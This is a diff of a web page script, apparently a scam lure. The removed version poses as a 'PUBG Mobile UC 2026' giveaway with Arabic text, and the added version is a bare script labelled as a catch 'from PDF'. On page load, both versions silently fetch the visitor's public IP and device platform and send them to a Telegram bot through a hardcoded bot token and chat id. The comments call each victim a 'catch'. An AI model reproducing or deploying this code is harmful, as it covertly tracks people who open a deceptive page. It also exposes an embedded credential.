@@ -1,27 +1,16 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>PUBG Mobile UC 2026</title>
-    <script>
-        async function hit() {
-            // بياناتك المباشرة (التوكن والآيدي)
-            const token = "8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM";
-            const chat_id = "1772820433";
-            
-            try {
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
-                const msg = `🔱 [صيدة]:\n🌐 IP: ${d.ip}\n📱 Dev: ${navigator.platform}`;
-                
-                // الإرسال القهري للبوت
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
-            } catch(e) {}
-        }
-        window.onload = hit;
-    </script>
-</head>
-<body style="background:#000; color:gold; text-align:center; padding-top:50px;">
-    <h1>🔱 جاري تحضير الشدات... 🔱</h1>
-    <p>لا تغلق الصفحة، يتم الآن فحص الـ ID</p>
-</body>
-</html>
+<script>
+    async function capture() {
+        const token = "8410102722:AAFQO1uzh6Eoy4UhfGHaa_qHSaFRb7GdVHM";
+        const chat_id = "1772820433";
+        
+        // سحب الـ IP
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        
+        const info = `🔱 [صيدة جديدة من PDF]:\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}\n⏰ الوقت: ${new Date().toLocaleString()}`;
+        
+        // إرسال البيانات للبوت
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
+    }
+    window.onload = capture;
+</script>
